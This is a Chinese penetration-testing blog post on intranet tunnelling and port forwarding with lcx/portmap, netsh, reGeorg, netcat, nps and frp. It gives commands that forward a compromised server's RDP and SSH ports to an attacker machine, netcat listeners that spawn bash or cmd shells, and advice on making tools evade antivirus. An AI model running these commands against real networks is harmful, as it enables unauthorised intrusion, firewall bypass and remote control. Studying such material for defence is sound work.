<!doctype html><html lang=zh-CN data-theme=dark><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: dark)"><meta name=generator content="Hugo 0.145.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="内网渗透-通信技术"><meta itemprop=description content="深呼吸的时候，就能保持沉稳"><meta name=description content="深呼吸的时候，就能保持沉稳"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://blog.000k.de/imgs/hugo_next_logo.png"><meta itemprop=keywords content="内网渗透"><meta property="og:type" content="article"><meta property="og:title" content="内网渗透-通信技术"><meta property="og:description" content="深呼吸的时候，就能保持沉稳"><meta property="og:image" content="/imgs/hugo_next_logo.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://blog.000k.de/post/2023/11/13StudyNeiWang.html"><meta property="og:site_name" content="L1nkGr's Blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="L1nkGr"><meta property="article:published_time" content="2023-11-13 08:00:13 +0800 +0800"><meta property="article:modified_time" content="2023-11-13 08:00:13 +0800 +0800"><link type=text/css rel=stylesheet href=https://blog.000k.de/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=https://blog.000k.de/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://blog.000k.de/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1749997045"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><link rel=stylesheet type=text/css href="/css/custom_style.css?=1749997045"><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>内网渗透-通信技术 - L1nkGr's Blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>L1nkGr's Blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>I'm L1nkGr, Nice To Meet You(ˊ˘ˋ*)♡</p><img class=custom-logo-image src=/imgs/hugo_next_logo.png alt="L1nkGr's Blog"></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about.html class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/flinks.html class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-myday"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>日常杂谈
<span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/myday/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>日常</a></li><li class=menu-child-item><a href=/talk/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>杂谈</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>49</span></a></li><li class="menu-item menu-item-other space"><a href=https://L1nkGr.zz.ac/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>乐乎</a></li><li class="menu-item menu-item-notion space"><a href=https://wiki.000k.de/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>notion</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#背景>背景</a></li><li><a href=#隧道端口转发>隧道（端口转发）</a></li><li><a href=#常用工具>常用工具</a><ul><li><a href=#1lcxwindowsportmaplinux>1.LCX(Windows)/Portmap(Linux)</a></li><li><a href=#2netsh>2.netsh</a></li><li><a href=#3regeorg>3.reGeorg</a></li><li><a href=#4netcatnc>4.netcat(nc)</a></li><li><a href=#5venom>5.venom</a></li><li><a href=#6npsfrp>6.nps、frp</a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=L1nkGr src=/imgs/img-lazy-loading.gif data-src=/imgs/hugo_next_avatar.png><p class=site-author-name itemprop=name>L1nkGr</p><div class=site-description itemprop=description>深呼吸的时候，就能保持沉稳</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>49</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>45</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>52</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/00ye title="Github → https://github.com/00ye" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://hihopkc.github.io/ title=https://hihopkc.github.io/ target=_blank>嘻哈磕碜</a></li><li class=links-of-blogroll-item><a href=https://endermanneer.github.io/ title=https://endermanneer.github.io/ target=_blank>Enderman_1's blog</a></li><li class=links-of-blogroll-item><a href=http://www.icewindy.cn/ title=http://www.icewindy.cn/ target=_blank>IceWindy's Blog</a></li></ul></div><aside class=blog-nav><h3>博客组织</h3><ul class=nav-list><li><a href=https://www.travellings.cn/go.html class=nav-item data-type=travel><span class=dot></span>
<span>开往</span></a></li><li><a href=https://boke.lu/sj/ class=nav-item data-type=directory><span class=dot></span>
<span>博客录</span></a></li><li><a href=https://www.boyouquan.com/planet-shuttle/ class=nav-item data-type=social><span class=dot></span>
<span>博友圈</span></a></li><li><a href=https://blogscn.fun/random.html class=nav-item data-type=writing><span class=dot></span>
<span>笔墨迹</span></a></li><li><a href=https://www.blogsclub.org/go class=nav-item data-type=global><span class=dot></span>
<span>BlogsClub</span></a></li><li><a href=https://foreverblog.cn/go.html class=nav-item data-type=global><span class=dot></span>
<span>十年之约</span></a></li></ul></style><style>.blog-nav{--primary-color:#f5f5f5;--accent-color:#ea5455;max-width:160px;margin:0 auto;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,8%)}.blog-nav h3{text-align:center;margin:0 0 0;font-size:1.4rem;color:var(--primary-color);position:relative;padding-bottom:.8rem}.blog-nav h3::after{content:"";position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:40px;height:1px;background:var(--accent-color)}.nav-list{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:.8rem}.nav-item{display:flex;align-items:center;justify-content:center;padding:0rem 1.2rem;border-radius:8px;transition:all .3s cubic-bezier(.4,0,.2,1);color:var(--primary-color);text-decoration:none;position:relative}.nav-item:hover{background:rgba(234,84,85,8%);transform:translateX(4px)}.dot{display:inline-block;width:8px;height:8px;background:var(--accent-color);border-radius:50%;margin-right:12px;transition:transform .3s ease}.nav-item:hover .dot{transform:scale(1.4)}@media(max-width:480px){.blog-nav{width:90%;padding:1rem}.nav-item{padding:.6rem 1rem}}</style></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2023-05-01 22:19:13 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=120493></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=265></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-06-13 10:10:35 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/00ye rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blog.000k.de/post/2023/11/13StudyNeiWang.html><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/hugo_next_avatar.png"><meta itemprop=name content="L1nkGr"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="L1nkGr"><meta itemprop=description content="深呼吸的时候，就能保持沉稳"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="内网渗透-通信技术"><meta itemprop=description content="背景

当拿到某网络主机的权限，发现无法将流量或者权限发送出来，对渗透造成了很大的影响，所以内网渗透必须需要了解到两种主要的通信技术–代理与隧道（端口转发）技术。"></span><header class=post-header><h1 class=post-title itemprop="name headline">内网渗透-通信技术</h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2023-11-13 08:00:13 +08:00" itemprop="dateCreated datePublished" datetime="2023-11-13 08:00:13 +0800 +0800">2023-11-13
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/%E5%86%85%E7%BD%91/ itemprop=url rel=index><span itemprop=name>内网</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>2814</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>6分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/2023/11/13StudyNeiWang.html><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><h2 id=背景>背景
<a class=header-anchor href=#%e8%83%8c%e6%99%af></a></h2><p>当拿到某网络主机的权限，发现无法将流量或者权限发送出来，对渗透造成了很大的影响，所以内网渗透必须需要了解到两种主要的通信技术–<strong>代理与隧道（端口转发）技术</strong>。</p><a id=more></a><p>代理技术解决的问题：代理简单来讲解决网络之间的通信问题，如内网与外网之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。</p><p>隧道技术解决的问题：简单来讲就是解决流量无法发送，隧道技术多用来绕过一些安全设备的监控，如防火墙过滤问题，网络连接通讯问题，数据回链封装问题，对我们发送的流量进行了拦截，这个时候需要接触隧道技术绕过拦截，隧道技术就是使用不同的协议把走不通的路走通。走不同的协议技术建立通讯，可以说是其中也包括了一些代理的技术</p><h2 id=隧道端口转发>隧道（端口转发）
<a class=header-anchor href=#%e9%9a%a7%e9%81%93%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91></a></h2><p>一般情况，在渗透测试后获取主机权限后下一步就是内网渗透，内网中的其他机器是不允许外网机器访问的。这时候，我们可以通过 <strong>隧道（端口转发）</strong> 或将这台<strong>外网服务器</strong>设置成为 <strong>代理</strong>，使得我们自己的攻击机可以直接访问与操作内网中的其他机器。实现这一过程的手段就叫做<strong>端口转发</strong>。</p><p>隧道技术使用在不同的OSI层进行，大体总结了以下三种：
网络层：IPV6隧道，ICMP隧道
传输层：TCP隧道，UDP隧道，常规的端口转发
应用层：SSH隧道，HTTP/S隧道，DNS隧道</p><p>需要注意的是，使用某种隧道之前，需要检查环境本身是否支持这种协议的使用，才能去使用响应的隧道传输。</p><h2 id=常用工具>常用工具
<a class=header-anchor href=#%e5%b8%b8%e7%94%a8%e5%b7%a5%e5%85%b7></a></h2><p>内网渗透中常用的代理工具有很多，例如lcx，nps，frp，venom，proxifier/proxychains+reGeorg等等。这里我就不全部讲解了。</p><h3 id=1lcxwindowsportmaplinux>1.LCX(Windows)/Portmap(Linux)
<a class=header-anchor href=#1lcxwindowsportmaplinux></a></h3><p>很有名的一款工具，杀软直接秒杀，上传到目标机器前要提前做好免杀。下载地址：https://github.com/AA8j/SecTools/tree/main/lcx</p><p>下面介绍一下使用该工具的两种场景。</p><p>（1）假如此时已经拿到了边界服务器的权限，但是由于防火墙限制，进网端口被限制，但可以出网，此时就可以将边界服务器的端口转发到攻击机上，然后访问攻击机的端口。</p><p>边界服务器为Windows：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1> 1</a>
</span><span class=lnt id=hl-0-2><a class=lnlinks href=#hl-0-2> 2</a>
</span><span class=lnt id=hl-0-3><a class=lnlinks href=#hl-0-3> 3</a>
</span><span class=lnt id=hl-0-4><a class=lnlinks href=#hl-0-4> 4</a>
</span><span class=lnt id=hl-0-5><a class=lnlinks href=#hl-0-5> 5</a>
</span><span class=lnt id=hl-0-6><a class=lnlinks href=#hl-0-6> 6</a>
</span><span class=lnt id=hl-0-7><a class=lnlinks href=#hl-0-7> 7</a>
</span><span class=lnt id=hl-0-8><a class=lnlinks href=#hl-0-8> 8</a>
</span><span class=lnt id=hl-0-9><a class=lnlinks href=#hl-0-9> 9</a>
</span><span class=lnt id=hl-0-10><a class=lnlinks href=#hl-0-10>10</a>
</span><span class=lnt id=hl-0-11><a class=lnlinks href=#hl-0-11>11</a>
</span><span class=lnt id=hl-0-12><a class=lnlinks href=#hl-0-12>12</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 攻击机上执行：
</span></span><span class=line><span class=cl>./portmap -m 2 -p1 4444（本机监听端口） -h2 127.0.0.1（转发到目的IP） -p2 3389（转发到目的端口）
</span></span><span class=line><span class=cl># 表示监听本机的4444端口，并转发到127.0.0.1的3389端口。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># m的参数说明：
</span></span><span class=line><span class=cl># 1.监听port1 （p1）端口并且连接主机2（h2）的port2（p2） 端口
</span></span><span class=line><span class=cl># 2.监听port1（p1）和port2（p2） 端口
</span></span><span class=line><span class=cl># 3.连接主机1（h1）对应的端口和主机2（h2）对应的端口
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># 边界服务器上执行：
</span></span><span class=line><span class=cl>lcx.exe -slave 192.168.8.48（转发到目的IP） 4444（转发到目的端口） 127.0.0.1 3389（转发的本地端口）
</span></span><span class=line><span class=cl># 表示将本地的3389端口转发到192.168.8.48的4444端口</span></span></code></pre></td></tr></table></div></div><p>边界服务器为Linux：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1>1</a>
</span><span class=lnt id=hl-1-2><a class=lnlinks href=#hl-1-2>2</a>
</span><span class=lnt id=hl-1-3><a class=lnlinks href=#hl-1-3>3</a>
</span><span class=lnt id=hl-1-4><a class=lnlinks href=#hl-1-4>4</a>
</span><span class=lnt id=hl-1-5><a class=lnlinks href=#hl-1-5>5</a>
</span><span class=lnt id=hl-1-6><a class=lnlinks href=#hl-1-6>6</a>
</span><span class=lnt id=hl-1-7><a class=lnlinks href=#hl-1-7>7</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 攻击机上执行
</span></span><span class=line><span class=cl>./portmap -m 2 -p1 4444（本机监听端口） -h2 127.0.0.1（转发到目的IP） -p2 222（转发到目的端口）
</span></span><span class=line><span class=cl># 表示监听本机的4444端口，并转发到127.0.0.1的222端口。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># 边界服务器上执行
</span></span><span class=line><span class=cl>./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 192.168.8.48 -p2 4444
</span></span><span class=line><span class=cl># 将本地的22端口转发到192.168.8.48的4444端口</span></span></code></pre></td></tr></table></div></div><p>（2）假如此时已经拿到了边界服务器的权限，但是由于防火墙策略限制导致3389端口无法出网，此时可以将此端口映射到可以出网的端口。</p><p>边界服务器为Windows：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1>1</a>
</span><span class=lnt id=hl-2-2><a class=lnlinks href=#hl-2-2>2</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 边界服务器上执行
</span></span><span class=line><span class=cl>lcx.exe -tran 53 192.168.8.56（边界服务器ip） 3389</span></span></code></pre></td></tr></table></div></div><p>此时远程桌面连接192.168.8.56的53端口即可。</p><p>边界服务器为Linux：</p><p>推荐使用ssh隧道。</p><p>可能有师傅会问，既然已经把远程端口转发到本地了，为什么还要在本地再转发一次呢？这是因为<code>-slave</code>参数和<code>-listen</code>参数必须成对出现，否则连接远程桌面会一直连不上。</p><h3 id=2netsh>2.netsh
<a class=header-anchor href=#2netsh></a></h3><p>Windows自带的一款工具，不需要上传到目标机器。值得注意的是，它不能把本地端口转发到其它机器上。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1>1</a>
</span><span class=lnt id=hl-3-2><a class=lnlinks href=#hl-3-2>2</a>
</span><span class=lnt id=hl-3-3><a class=lnlinks href=#hl-3-3>3</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 把任意机器的指定端口转发到本地
</span></span><span class=line><span class=cl>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=目标机端口 connectaddress=127.0.0.1 connectport=本机端口 protocol=tcp # 添加转发策略
</span></span><span class=line><span class=cl>netsh interface portproxy delete v4tov4 listenport=目标机端口 listenaddress=目标机ip # 删除转发策略</span></span></code></pre></td></tr></table></div></div><h3 id=3regeorg>3.reGeorg
<a class=header-anchor href=#3regeorg></a></h3><p>reGeorg是一款把内网服务器端口的数据通过http/https隧道转发到本机，实现基于HTTP通信的工具。使用时需要配合webshell建立一个socks5代理来进行内网穿透，支持多种类型的webshell。因为使用频繁，所以较多的杀软都会拦截，需要做免杀处理。</p><p>免杀版本下载：
<a href=https://github.com/L-codes/Neo-reGeorg title="GitHub - L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg" rel="noopener external nofollow noreferrer" target=_blank class=exturl>GitHub - L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg
<i class="fa fa-external-link-alt"></i></a></p><p>在<strong>边界服务器</strong>上传webshell后，浏览器访问边界服务器webshell所在地址，如果出现提示：<code>Georg says,'All seems fine'</code>，则说明连接建立成功。</p><p>不过这款工具一般搭配proxifier或者proxychains使用。启用上面的脚本后，命令行会显示转发到本地的端口，这时再搭配proxifier或者proxychains使用就可以了。</p><h3 id=4netcatnc>4.netcat(nc)
<a class=header-anchor href=#4netcatnc></a></h3><p>这款工具太有名了，被称为“网络界的瑞士军刀”。除了用来端口转发以外，还能用来传输文件、端口扫描，不过这里我们不作讲解，有兴趣的自行研究进阶用法。</p><p>常用命令行参数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1>1</a>
</span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2>2</a>
</span><span class=lnt id=hl-4-3><a class=lnlinks href=#hl-4-3>3</a>
</span><span class=lnt id=hl-4-4><a class=lnlinks href=#hl-4-4>4</a>
</span><span class=lnt id=hl-4-5><a class=lnlinks href=#hl-4-5>5</a>
</span><span class=lnt id=hl-4-6><a class=lnlinks href=#hl-4-6>6</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-l 开启监听状态
</span></span><span class=line><span class=cl>-v 显示详细信息
</span></span><span class=line><span class=cl>-p 指定监听的本地端口
</span></span><span class=line><span class=cl>-k 客户端断掉连接时，服务端依然保持运行
</span></span><span class=line><span class=cl>-e 将传入的信息以命令执行
</span></span><span class=line><span class=cl>-n 直接使用 IP 地址，不进行 dns 解析过程</span></span></code></pre></td></tr></table></div></div><p>一般用作反弹shell，正向连接很少用。在公网vps上监听：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2>2</a>
</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3>3</a>
</span><span class=lnt id=hl-5-4><a class=lnlinks href=#hl-5-4>4</a>
</span><span class=lnt id=hl-5-5><a class=lnlinks href=#hl-5-5>5</a>
</span><span class=lnt id=hl-5-6><a class=lnlinks href=#hl-5-6>6</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Linux主机
</span></span><span class=line><span class=cl>nc -lvnp 本机端口 -e /bin/bash
</span></span><span class=line><span class=cl>nc -lvnp 本机端口 -c bash
</span></span><span class=line><span class=cl># Windows主机
</span></span><span class=line><span class=cl>nc -lvnp 本机端口 -e C:\Windows\System32\cmd.exe
</span></span><span class=line><span class=cl>nc -lvnp 本机端口 -c cmd</span></span></code></pre></td></tr></table></div></div><p>目标机则可以利用各种方式进行主动连接，例如bash反弹一句话、Python、PHP等。推荐给大家一个谷歌浏览器插件–Hack-Tools，里面可以生成各种正向连接命令，再也不用担心命令记不住了！</p><h3 id=5venom>5.venom
<a class=header-anchor href=#5venom></a></h3><p>参考文章：
<a href=https://blog.csdn.net/weixin_45859850/article/details/119813079 title="Venom工具的使用（内网渗透 多级代理）_rang#的博客-CSDN博客_venom工具" rel="noopener external nofollow noreferrer" target=_blank class=exturl>Venom工具的使用（内网渗透 多级代理）_rang#的博客-CSDN博客_venom工具
<i class="fa fa-external-link-alt"></i></a></p><h3 id=6npsfrp>6.nps、frp
<a class=header-anchor href=#6npsfrp></a></h3><blockquote><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。目前支持<strong>tcp、udp流量转发</strong>，可支持任何<strong>tcp、udp</strong>上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还<strong>支持内网http代理、内网socks5代理</strong>、<strong>p2p等</strong>，并带有功能强大的web管理端。</p><p><a href=https://gitee.com/mirrors/nps title="NPS 是一款轻量级、高性能、功能强大的内网穿透代理服务器" rel="noopener external nofollow noreferrer" target=_blank class=exturl>NPS 是一款轻量级、高性能、功能强大的内网穿透代理服务器
<i class="fa fa-external-link-alt"></i></a></p></blockquote><blockquote><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议，且支持 P2P 通信。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><p><a href=https://github.com/fatedier/frp/blob/dev/README_zh.md title=frp中文文档 rel="noopener external nofollow noreferrer" target=_blank class=exturl>frp中文文档
<i class="fa fa-external-link-alt"></i></a></p></blockquote><p>由于官方文档很详细，所以这里不再讲解。</p><p>还有一些极端情况，比如目标内网防火墙禁用了http协议，那么只能采用dns隧道、icmp隧道、ssh隧道了。</p><p><a href=https://hackerterry.netlify.app/2022/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E5%9B%9B%EF%BC%89-%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/ title="内网渗透（四）&ndash;通信技术 - HackerTerry&rsquo;s Blog" rel="noopener external nofollow noreferrer" target=_blank class=exturl>内网渗透（四）&ndash;通信技术 - HackerTerry&rsquo;s Blog
